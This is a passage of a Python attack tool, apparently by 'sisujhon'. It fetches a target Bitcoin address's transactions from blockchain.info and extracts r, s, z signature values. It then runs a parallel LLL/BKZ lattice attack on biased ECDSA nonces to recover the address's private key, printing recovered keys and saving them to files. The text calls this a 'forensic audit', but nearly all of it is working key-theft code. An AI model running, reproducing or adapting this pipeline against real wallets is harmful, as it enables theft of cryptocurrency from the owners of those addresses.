        sys.stdout = devnull
        try:
            keys = Attack(subset, mode=mode, l=l_try, k_known=k_known)
        except RuntimeError as e:
            # RuntimeError from fpylll C++ (e.g. 'infinite loop in babai')
            pass
        except Exception as e:
            # Print full traceback to real stderr so we can see exact line
            tb = traceback.format_exc()
            print(f"[attack_worker] ERROR mode={mode} l={l_try}: {type(e).__name__}: {e}",
                  file=sys.__stderr__)
            print(tb, file=sys.__stderr__)
        finally:
            sys.stdout = old_stdout
    return keys, (mode, l_try, len(subset))

# ══════════════════════════════════════════════════════════════════════════════
#  MAIN PIPELINE  —  called by ecdsa_forensic.py CRYPTOGRAPHYTUBE
# ══════════════════════════════════════════════════════════════════════════════

def run_lll_attack(address: str, rsz_list: list,
                   output_dir: str = ".",
                   known_lsb_bits=None,
                   k_known_val=0) -> list:
    """
    Full ECDSA lattice-attack pipeline.

    Parameters
    ----------
    address        : str         — target Bitcoin address
    rsz_list       : list        — [(r, s, z), …] integer tuples
    output_dir     : str         — folder for output files
    known_lsb_bits : int|None    — leakage bits (None = auto-estimate)

    Returns
    -------
    list[str]  — 'addr_c:addr_u:privkey_hex' for each match
    """
    import random
    import multiprocessing
    import os

    # ── Create a folder named after the address — Absolute Path ──────────────
    base_out = os.path.abspath(output_dir)
    final_dir = os.path.join(base_out, address)
    os.makedirs(final_dir, exist_ok=True)
    found_path = os.path.join(final_dir, "found.txt")

    print(f"\n[LLL] ══ Starting LLL-Attack-v6 for {address} ══")
    print(f"[LLL] Signatures supplied : {len(rsz_list)}")

    # ── Diagnostic: Check if SageMath is available ──────────────────────────
    if not _SAGE_AVAILABLE:
        print(f"{Fore.RED}[LLL] CRITICAL: SageMath NOT found!{Style.RESET_ALL}")
        print(f"{Fore.RED}[LLL] HNP lattice attack CANNOT run without SageMath.{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[LLL] Install: sudo apt install sagemath{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[LLL] OR run lll.py using: sage lll.py (inside SageMath shell){Style.RESET_ALL}")
        return []
    else:
        print(f"{Fore.GREEN}[LLL] SageMath: OK{Style.RESET_ALL}")
    
    if _FPYLLL_AVAILABLE:
        print(f"{Fore.GREEN}[LLL] fpylll: OK (BKZ acceleration enabled){Style.RESET_ALL}")
    else:
        print(f"{Fore.YELLOW}[LLL] fpylll: NOT found (using SageMath BKZ fallback){Style.RESET_ALL}")

    if len(rsz_list) < 2:
        print("[LLL] Need ≥ 2 signatures.")
        return []

    all_keys = []

    print("[LLL] Running NO-MISS Biased-Nonce LLL/BKZ multi-attack engine ...")

    # ── 1. FIX 1: Preparation & Detection (Strict Filtering) ─────────────────
    sigs = clean_sigs(normalize_sigs(rsz_list))
    limit_m = min(len(sigs), 500) # Increased to 500 for better accuracy with large datasets
    
    # Heuristic: Small Nonce test
    k_ests = [((sig[2] * _modinv(sig[1])) % _N) for sig in sigs]
    small_nonce_bits = 0
    for b in [64, 128, 160]:
        if sum(1 for k in k_ests if k < (2**b)) > (len(sigs) * 0.5):
            small_nonce_bits = b
            break
    
    # --- 1.2. Preliminary Audit (Smart Triage) ---
    detected_modes = pre_attack_audit(sigs)
    bias_info = detected_modes

    # ── 1.5. Elite Lattice Detections (Instant Results) ───────────────────
    solver_tasks = [
        ("BKZ-Deep", solve_bkz_deep, (sigs, address, bias_info)),
        ("Small-K", solve_small_k_lattice, (sigs, address))
    ]
    
    print("Ready.")
    candidates = []
    
    # ASYNC CALLBACK for real-time reporting
    def collect_result(result_tuple):
        name, res = result_tuple
        if res:
            for dk in res:
                if dk not in candidates:
                    candidates.append(dk)
                    # Instant validation and display with attribution
                    if validate_full(dk, sigs, address):
                        process_recovered_keys(address, [dk], final_dir, found_path, source=name)
        sys.stdout.write(f"    - Worker: {name} scan finished.\n")
        sys.stdout.flush()

    try:
        num_cores = max(1, multiprocessing.cpu_count() - 1)
        with multiprocessing.Pool(processes=num_cores) as pool:
            print(f"    [LLL] Workers active: {num_cores}")
            for name, func, args in solver_tasks:
                print(f"    - Worker: {name} scan active...")
                pool.apply_async(_run_solver, args=((name, func, args),), callback=collect_result)
            
            pool.close()
            pool.join()
    except Exception as e:
        print(f"    [!] Parallel Error: {e}. Switching to high-speed serial...")
        for name, func, args in solver_tasks:
            res = _run_solver((name, func, args))
            collect_result(res)
    
    unique_candidates = list(set(candidates))
    print(f"\n    [LLL] Initial Lattice scan complete. {len(unique_candidates)} potential candidates found.")

    # 3. Validation & Point Mul Check
    if unique_candidates:
        print(f"    - Verifying candidates via Point Mul... ", end='', flush=True)
        for dk in unique_candidates:
            if validate_full(dk, sigs, address):
                all_keys.append(dk)
        print("Done.")

    if all_keys:
        # Instead of just all_keys.append, we process immediately for display
        process_recovered_keys(address, all_keys, final_dir, found_path)

    if True: # Non-stop audit, continue to Phase 2
        print(Fore.RED + "[LLL] Phase 1 complete. Proceeding to Deep Search Engine..." + Style.RESET_ALL)
        # ── 2. Task Generator (Intelligent Priority) ─────────────────────
        def generate_tasks():
            # 0. User-Specified Depth (Highest Priority)
            if known_lsb_bits:
                print(f"[LLL] Task Generator: Focusing on user-specified {known_lsb_bits} bits leakage.")
                for mode in ["LSB", "MSB"]:
                    pool_sigs = score_and_filter_sigs(sigs, mode=mode, n_select=limit_m)
                    for m_try in [32, 48, 64]:
                        if m_try > limit_m: continue
                        for _ in range(5):
                            subset = random.sample(pool_sigs, m_try)
                            yield (subset, mode, known_lsb_bits, k_known_val)
                return # Crucial: Stop generator if user specified bits


            # 1. Use the audit results (If nothing specified or as fallback)
            for m_type, b_depth in detected_modes:
                # Try the exact depth and some neighbors
                for l in range(max(1, b_depth-1), min(256, b_depth+2)):
                    m_opts = [32, 48] if l <= 2 else [24, 32, 48, 64]
                    for m_try in m_opts:
                        if m_try > limit_m: continue
                        pool_sigs = score_and_filter_sigs(sigs, mode=m_type, n_select=limit_m)
                        for _ in range(2):
                            subset = random.sample(pool_sigs, m_try)
                            yield (subset, m_type, l, k_known_val)

            # 2. Joint LSB+MSB mode if both detected (High Success for 1-bit)
            if any(m[0] == 'LSB' for m in detected_modes) and any(m[0] == 'MSB' for m in detected_modes):
                for m_try in [48, 64, 80]:
                    if m_try > limit_m: continue
                    pool_sigs = score_and_filter_sigs(sigs, mode="LSB", n_select=limit_m)
                    for _ in range(3):
                        subset = random.sample(pool_sigs, m_try)
                        yield (subset, "JOINT", 1, 0)

            # 3. Exhaustive Full-Sweep (1 to 256 bits) — requested by user for automatic mode
            if not known_lsb_bits:
                print(f"[LLL] Task Generator: Entering Exhaustive Audit (1-256 bits)...")
                print(f"{Fore.RED}[!] WARNING: Performing full 1-256 bit sweep for LSB & MSB (512+ tasks).{Style.RESET_ALL}")
                print(f"{Fore.RED}[!] This is a true brute-force lattice attack and will take significant time!{Style.RESET_ALL}")
                for l in range(1, 257):
                    for mode in ["LSB", "MSB"]:
                        pool_sigs = score_and_filter_sigs(sigs, mode=mode, n_select=limit_m)
                        m_try = 32 if l < 10 else 24
                        if m_try > limit_m: continue
                        subset = random.sample(pool_sigs, m_try)
                        yield (subset, mode, l, k_known_val)


        # ── 3. Parallel Execution ────────────────────────────────────────────────
        cores = min(5, max(1, multiprocessing.cpu_count() - 1))
        print(f"[LLL] Deep Search Engine: {limit_m} sigs | Parallel Scan starting on {cores} cores...")
        
        task_count = 0
        with multiprocessing.Pool(processes=cores) as pool:
            for result in pool.imap_unordered(attack_worker, generate_tasks(), chunksize=1):
                keys, info = result
                task_count += 1
                mode_info, l_info, m_info = info
                print(f"    \r[PROGRESS] Task #{task_count} | Audit: {mode_info}-{l_info}bits (m={m_info}) ... ", end='', flush=True)
                
                if keys:
                    # Filter only new keys to avoid spamming the same found message
                    new_keys = [k for k in keys if k not in all_keys]
                    if new_keys:
                        all_keys.extend(new_keys)
                        process_recovered_keys(address, new_keys, final_dir, found_path)
                    # Note: We do NOT terminate the pool; continuing full audit as requested.
        print(f"\n[LLL] Full Exhaustive Audit completed ({task_count} lattice tasks total).")

    if not all_keys:
        print("[LLL] No private key candidates recovered after full NO-MISS sweep.")
        print("[LLL] Reason: Target likely has no nonce bias, or leakage is too complex.")
        return []

    # Deduplicate
    all_keys = list(dict.fromkeys(all_keys))
    print(f"[LLL] Total unique candidates: {len(all_keys)} — verifying ...")

    # ── Phase 3: Address verification ────────────────────────────────────────
    matches            = []
    mixaddr_path       = os.path.abspath(os.path.join(final_dir, "mixaddress.txt"))
    mathfound_path     = os.path.abspath(os.path.join(final_dir, "mathfound.txt"))
    nomatchaddr_path   = os.path.abspath(os.path.join(final_dir, "nomatchaddress.txt"))

    for key_int in all_keys:
        if not (0 < key_int < _N):
            continue
        addr_c, addr_u = privkey_to_addresses(key_int)
        key_hex = _rrr(key_int)   # full 64-char hex

        matched = (addr_c == address or addr_u == address)

        if matched:
            tag_c = " ← MATCH" if addr_c == address else ""
            tag_u = " ← MATCH" if addr_u == address else ""
            line  = f"{addr_c}:{addr_u}:0x{key_hex}"
            matches.append(line)

            print(f"\n[LLL] ★★★ PRIVATE KEY FOUND ★★★")
            print(f"[LLL]   Compressed   : {addr_c}{tag_c}")
            print(f"[LLL]   Uncompressed : {addr_u}{tag_u}")
            print(f"[LLL]   Private key  : 0x{key_hex}")

            try:
                with open(found_path, 'a', encoding='utf-8') as f:
                    f.write("=" * 64 + "\n")
                    f.write(f"Target       : {address}\n")
                    f.write(f"Compressed   : {addr_c}\n")
                    f.write(f"Uncompressed : {addr_u}\n")
                    f.write(f"Privkey      : 0x{key_hex}\n")
                    f.write("=" * 64 + "\n")
                    f.flush()
                    os.fsync(f.fileno())
                print(f"[LLL]   Saved to     : {found_path}")
            except Exception as e:
                print(f"[LLL] Warning \u2014 could not save found.txt: {e}")

            try:
                matched_addr = addr_c if addr_c == address else addr_u
                with open(mathfound_path, 'a', encoding='utf-8') as f:
                    f.write(f"{matched_addr}:0x{key_hex}\n")
                    f.flush()
                    os.fsync(f.fileno())
                print(f"[LLL]   mathfound.txt: {mathfound_path}")
            except Exception as e:
                print(f"[LLL] Warning \u2014 could not save mathfound.txt: {e}")

        else:
            # ── Full key display (no truncation) ─────────────────────────
            print(f"[LLL] no-match  C={addr_c}  U={addr_u}  key=0x{key_hex}")

            # ── mixaddress.txt (both addresses + full private key) ────────
            try:
                with open(mixaddr_path, 'a', encoding='utf-8') as f:
                    f.write(f"{addr_c}:{addr_u}:0x{key_hex}\n")
            except Exception as e:
                print(f"[LLL] Warning — could not save mixaddress.txt: {e}")

            # ── nomatchaddress.txt (only addresses, NO private key, line by line) ─
            try:
                with open(nomatchaddr_path, 'a', encoding='utf-8') as f:
                    f.write(f"{addr_c}\n")
                    f.write(f"{addr_u}\n")
            except Exception as e:
                print(f"[LLL] Warning — could not save nomatchaddress.txt: {e}")

    if not matches:
        print("[LLL] No candidate matched the target address.")
        if os.path.exists(mixaddr_path):
            print(f"[LLL] No-match addresses+keys  → {mixaddr_path}")
        if os.path.exists(nomatchaddr_path):
            print(f"[LLL] No-match addresses only  → {nomatchaddr_path}")

    print(f"[LLL] ══ Done ══\n")
    return matches




# ══════════════════════════════════════════════════════════════════════════════
#  STANDALONE MODE  (python lll.py  /  sage lll.py  /  python lll.py wallet.txt) CRYPTOGRAPHYTUBE
# ══════════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    import time
    from urllib.request import urlopen

    try:
        import requests
        from colorama import Fore, Style
    except ImportError:
        print("[!] Install: pip install requests colorama")
        sys.exit(1)

    import sys
    if sys.platform.startswith('win'):
        try:
            sys.stdout.reconfigure(encoding='utf-8')
        except:
            pass


    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.YELLOW + r"""
  ██████╗██████╗ ██╗   ██╗██████╗ ████████╗ ██████╗  ██████╗ ██████╗  █████╗ ██████╗ ██╗  ██╗██╗   ██╗████████╗██╗   ██╗██████╗ ███████╗
 ██╔════╝██╔══██╗╚██╗ ██╔╝██╔══██╗╚══██╔══╝██╔═══██╗██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██║  ██║╚██╗ ██╔╝╚══██╔══╝██║   ██║██╔══██╗██╔════╝
 ██║     ██████╔╝ ╚████╔╝ ██████╔╝   ██║   ██║   ██║██║  ███╗██████╔╝███████║██████╔╝███████║ ╚████╔╝    ██║   ██║   ██║██████╔╝█████╗
 ██║     ██╔══██╗  ╚██╔╝  ██╔═══╝    ██║   ██║   ██║██║   ██║██╔══██╗██╔══██║██╔═══╝ ██╔══██║  ╚██╔╝     ██║   ██║   ██║██╔══██╗██╔══╝
 ╚██████╗██║  ██║   ██║   ██║        ██║   ╚██████╔╝╚██████╔╝██║  ██║██║  ██║██║     ██║  ██║   ██║      ██║   ╚██████╔╝██████╔╝███████╗
  ╚═════╝╚═╝  ╚═╝   ╚═╝   ╚═╝        ╚═╝    ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝   ╚═╝      ╚═╝    ╚═════╝ ╚═════╝ ╚══════╝
                                          LLL-Attack CRYPTOGRAPHYTUBE  |  HNP/CVP  |  Biased-Nonce LSB Leakage
""" + Style.RESET_ALL)

    print(Fore.LIGHTYELLOW_EX + "  Author : sisujhon" + Style.RESET_ALL)

    # ── Raw-tx parsing helpers CRYPTOGRAPHYTUBE ────────────────────────────────────────────────

    def _get_rawtx(txid):
        try:
            return urlopen(
                f"https://blockchain.info/rawtx/{txid}?format=hex",
                timeout=20).read().decode()
        except Exception as e:
            print(f"  [!] rawtx fetch failed for {txid}: {e}")
            return None

    def _hash160(pubk_hex):
        return hashlib.new('ripemd160',
                           hashlib.sha256(bytes.fromhex(pubk_hex)).digest()).hexdigest()

    def _get_rsz_from_raw(rawtx):
        """Parse legacy P2PKH raw tx → list of (r, s, z) integer tuples."""
        if not rawtx or len(rawtx) < 130:
            return []
        if rawtx[8:12] == '0001':   # SegWit — skip
            return []
        try:
            inp_nu = int(rawtx[8:10], 16)
            cur = 10
            inp_list = []
            for _ in range(inp_nu):
                prv_out = rawtx[cur:cur + 64]
                var0    = rawtx[cur + 64:cur + 72]
                cur    += 72
                sLen    = int(rawtx[cur:cur + 2], 16)
                script  = rawtx[cur:2 + cur + 2 * sLen]
                seq     = rawtx[2 + cur + 2 * sLen:10 + cur + 2 * sLen]
                sigLen  = int(script[2:4], 16)
                sig     = script[4:4 + sigLen * 2]
                rLen    = int(sig[4:6], 16)
                r_hex   = sig[6:6 + rLen * 2]
                s_hex   = sig[8 + rLen * 2:]
                pubLen  = int(script[4 + sigLen * 2:4 + sigLen * 2 + 2], 16)
                pub     = script[4 + sigLen * 2 + 2:]
                inp_list.append([prv_out, var0, r_hex, s_hex, pub, seq])
                cur = 10 + cur + 2 * sLen
            rest  = rawtx[cur:]
            first = rawtx[0:10]
            tot   = len(inp_list)
            results = []
            for one in range(tot):
                e = first
                for i in range(tot):
                    e += inp_list[i][0] + inp_list[i][1]
                    if one == i:
                        e += '1976a914' + _hash160(inp_list[one][4]) + '88ac'
                    else:
                        e += '00'
                    e += inp_list[i][5]
                e += rest + "01000000"
                z_hex = hashlib.sha256(
                    hashlib.sha256(bytes.fromhex(e)).digest()).hexdigest()
                results.append((
                    int(inp_list[one][2], 16),
                    int(inp_list[one][3], 16),
                    int(z_hex, 16)
                ))
            return results
        except Exception as exc:
            print(f"  [!] parse error: {exc}")
            return []

    def _get_txids(wallet):
        """Fetch transaction IDs using official Blockchain.info API only."""
        txids = []
        offset = 0
        limit  = 50
        while True:
            try:
                # Official Blockchain.info address API
                url  = (f"https://blockchain.info/rawaddr/{wallet}"
                        f"?limit={limit}&offset={offset}")
                resp = requests.get(url, timeout=15)
                resp.raise_for_status()
                data = resp.json()
                txs  = data.get("txs", [])
                if not txs:
                    break
                for tx in txs:
                    txid = tx.get("hash", "")
                    if txid and txid not in txids:
                        txids.append(txid)
                # If fewer results than limit → last page
                if len(txs) < limit:
                    break
                offset += limit
                time.sleep(0.5)
            except Exception as e:
                print(f"  [!] blockchain.info error (offset={offset}): {e}")
                break
        return txids

    # ── Manual file input (ecdsa_forensic.py should have created {address}.txt) ────────────
    print(Fore.LIGHTYELLOW_EX + "\n  [?] ecdsa_forensic.py has created a .txt file named after the address." + Style.RESET_ALL)
    print(Fore.WHITE +      "      Example: 1A1zPfix karo 1eP5QGefi2DMPTfTL5SLmv7DivfNa.txt" + Style.RESET_ALL)
    print()

    # Command-line argument parsing
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument("file", help="Input RSZ file")
    parser.add_argument("--b", type=int, help="Known leakage bits", default=None)
    parser.add_argument("--k-known", type=str, help="Known nonce part (hex)", default=None)
    parser.add_argument("--limit", type=int, help="Max signatures", default=None)
    
    # Check if any args are passed, else fallback to interactive
    if len(sys.argv) > 1:
        args = parser.parse_args()
        input_file = args.file
        known_lsb = args.b
        k_known_val = int(args.k_known, 16) if args.k_known else 0
    else:
        input_file = input(Fore.CYAN + "  Enter filename (e.g. 1ABC...xyz.txt) : " + Style.RESET_ALL).strip()
        bits_str = input(Fore.CYAN + "  Enter leakage bits (leave empty for auto-audit) : " + Style.RESET_ALL).strip()
        known_lsb = int(bits_str) if bits_str else None
        k_known_val = 0

    if not input_file:
        print(Fore.RED + "[!] No file entered. Exiting." + Style.RESET_ALL)
        sys.exit(1)

    if os.path.isdir(input_file):
        if os.path.exists(input_file + ".txt"):
            input_file = input_file + ".txt"
        else:
            print(Fore.RED + f"[!] Error: {input_file} is a directory. Provide the .txt file." + Style.RESET_ALL)
            sys.exit(1)

    if not os.path.exists(input_file):
        print(Fore.RED + f"[!] File not found: {input_file}" + Style.RESET_ALL)
        print(Fore.YELLOW + "    → Run ecdsa_forensic.py first so the file can be created." + Style.RESET_ALL)
        sys.exit(1)

    # ── Parse r,s,z file CRYPTOGRAPHYTUBE ───────────────────────────────────────────────────
    wallet  = None
    recovered_hint = None
    rsz_all = []
    with open(input_file, encoding='utf-8') as f:
        for line in f:
            line = line.strip()
            if not line: continue
            if line.startswith('#'):
                if 'Address :' in line:
                    wallet = line.split(':', 1)[1].strip()
                if 'RECOVERED_KEY:' in line:
                    try: recovered_hint = int(line.split(':', 1)[1].strip(), 16)
                    except: pass
                continue
            parts = line.split(',')
            if len(parts) >= 3:
                try:
                    r = int(parts[0].strip(), 16)
                    s = int(parts[1].strip(), 16)
                    z = int(parts[2].strip(), 16)
                    txid = parts[3].strip() if len(parts) >= 4 else "Unknown-TXID"
                    if r and s and z: 
                        rsz_all.append((r, s, z, txid))
                except ValueError: pass

    # Fallback: get address from filename
    if wallet is None:
        wallet = os.path.splitext(os.path.basename(input_file))[0]

    print(Fore.GREEN  + f"\n  [+] Address  : {wallet}" + Style.RESET_ALL)
    print(Fore.GREEN  + f"  [+] RSZ rows : {len(rsz_all)}" + Style.RESET_ALL)

    if not rsz_all:
        print(Fore.RED + "[!] No valid r,s,z rows found in the file." + Style.RESET_ALL)
        sys.exit(1)

    # ── Run the attack CRYPTOGRAPHYTUBE ──────────────────────────────────────────────────────
    if recovered_hint:
        print(Fore.CYAN + f"\n[LLL] Metadata Hint: Found potential key in input file." + Style.RESET_ALL)
        if validate_full(recovered_hint, rsz_all, wallet):
            print(Fore.GREEN + f"[LLL] Metadata Verification: SUCCESS! Key is valid." + Style.RESET_ALL)
            process_recovered_keys(wallet, [recovered_hint], "results", f"{wallet}_found.txt", source="Forensic Audit")
            # If validated, we can skip or proceed to show workers
    
    matches = run_lll_attack(wallet, rsz_all, output_dir=".", 
                            known_lsb_bits=known_lsb, 
                            k_known_val=k_known_val)

    if matches:
        print(Fore.RED + f"\n  ★★★ FOUND: {len(matches)} key(s) — saved to found.txt ★★★\n"
              + Style.RESET_ALL)
    else:
        print(Fore.MAGENTA + "  No private key found.\n" + Style.RESET_ALL)